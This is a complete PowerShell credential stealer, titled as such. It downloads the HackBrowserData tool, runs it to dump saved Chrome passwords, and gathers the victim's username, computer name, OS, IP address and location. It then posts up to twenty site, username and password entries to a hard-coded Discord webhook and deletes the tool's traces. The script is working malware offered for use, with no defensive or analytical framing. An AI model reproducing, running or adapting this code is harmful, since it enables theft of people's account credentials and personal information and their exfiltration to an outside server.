# Simple Chrome Password Stealer - Downloads pre-built tool

$logFile = "$env:USERPROFILE\Desktop\extract_log.txt"

function Log {
    param($msg)
    $time = Get-Date -Format "HH:mm:ss"
    $line = "[$time] $msg"
    Add-Content $logFile $line
    Write-Host $line
}

"=== Password Extraction Started ===" | Out-File $logFile
Log "Script started"

try {
    # Download HackBrowserData - a pre-compiled Chrome password dumper
    Log "Downloading password extraction tool..."
    
    $toolUrl = "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-v0.4.6-windows-amd64.zip"
    $zipPath = "$env:TEMP\hbd.zip"
    $extractPath = "$env:TEMP\hbd"
    
    Invoke-WebRequest -Uri $toolUrl -OutFile $zipPath -UseBasicParsing
    Log "Downloaded tool"
    
    # Extract
    Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
    Log "Extracted tool"
    
    # Run the tool
    $exePath = "$extractPath\hack-browser-data.exe"
    Log "Running extractor..."
    Log "Executable path: $exePath"
    Log "Exists: $(Test-Path $exePath)"
    
    $output = & $exePath --browser chrome --results-dir "$env:TEMP\chrome_results" --format json 2>&1 | Out-String
    Log "Tool output: $output"
    Log "Extraction complete"
    
    # List all files created
    if (Test-Path "$env:TEMP\chrome_results") {
        $files = Get-ChildItem "$env:TEMP\chrome_results" -Recurse
        Log "Files created:"
        foreach ($file in $files) {
            Log "  - $($file.Name) ($($file.Length) bytes)"
        }
    } else {
        Log "Results directory not created!"
    }
    
    # Parse JSON results
    $resultsFile = "$env:TEMP\chrome_results\chrome_password.json"
    
    Log "Looking for results at: $resultsFile"
    Log "File exists: $(Test-Path $resultsFile)"
    
    $passwords = @()
    
    if (Test-Path $resultsFile) {
        $rawContent = Get-Content $resultsFile -Raw
        Log "File content length: $($rawContent.Length) chars"
        Log "First 200 chars: $($rawContent.Substring(0, [Math]::Min(200, $rawContent.Length)))"
        
        $jsonData = $rawContent | ConvertFrom-Json
        
        Log "JSON entries count: $($jsonData.Count)"
        
        foreach ($entry in $jsonData) {
            $passwords += @{
                URL = $entry.url
                User = $entry.username
                Pass = $entry.password
            }
        }
        
        Log "Parsed $($passwords.Count) passwords"
    } else {
        Log "No results file found at: $resultsFile"
        
        # Try to find any JSON files
        $allJsonFiles = Get-ChildItem "$env:TEMP\chrome_results" -Filter *.json -Recurse -ErrorAction SilentlyContinue
        Log "All JSON files found: $($allJsonFiles.Count)"
        foreach ($f in $allJsonFiles) {
            Log "  Found: $($f.FullName)"
        }
    }
    
    # Cleanup
    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue
    Remove-Item "$env:TEMP\chrome_results" -Recurse -Force -ErrorAction SilentlyContinue
    
} catch {
    Log "Error: $($_.Exception.Message)"
}

# Get system info
Log "Getting system info..."
$user = $env:USERNAME
$computer = $env:COMPUTERNAME
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$time = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

try {
    $ipInfo = Invoke-RestMethod -Uri "http://ip-api.com/json/"
    $ip = $ipInfo.query
    $country = $ipInfo.country
    $city = $ipInfo.city
} catch {
    $ip = "Unknown"
    $country = "Unknown"
    $city = "Unknown"
}

# Format for Discord
$passText = ""
$max = [Math]::Min($passwords.Count, 20)

for ($i = 0; $i -lt $max; $i++) {
    $p = $passwords[$i]
    $passText += "`n**$($p.URL)**`nUser: ``$($p.User)```nPass: ``$($p.Pass)```n"
}

if ($passwords.Count -gt 20) {
    $passText += "`n... +$($passwords.Count - 20) more"
}

if (-not $passText) {
    $passText = "`nNo passwords extracted"
}

$message = @"
**🚨 New Connection**
:clock1: $time
:computer: $computer | $user
:desktop: $os
:globe_with_meridians: $ip - $city, $country

**🔐 Passwords ($($passwords.Count)):**$passText
"@

# Send to Discord
Log "Sending to Discord..."
$webhookUrl = "https://discord.com/api/webhooks/1453475000702206156/Ca0qqkCYAAHYznCwmCLdGOKB3ebrQTWuwK2bklV31WJOqOOoHXtjgMIAykTVHl0gw6vP"

if ($message.Length -gt 1900) {
    $message = $message.Substring(0, 1900)
}

try {
    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body (@{content=$message}|ConvertTo-Json) -ContentType "application/json"
    Log "SUCCESS! Sent to Discord"
} catch {
    Log "Discord send failed: $($_.Exception.Message)"
}

# Save locally
$outFile = "$env:USERPROFILE\Desktop\passwords.txt"
if ($passwords.Count -gt 0) {
    $passwords | Format-List | Out-File $outFile
    Log "Saved to: $outFile"
}

Write-Host "`n=== Complete! Check Desktop for logs ===" -ForegroundColor Green
Read-Host "Press Enter to close"
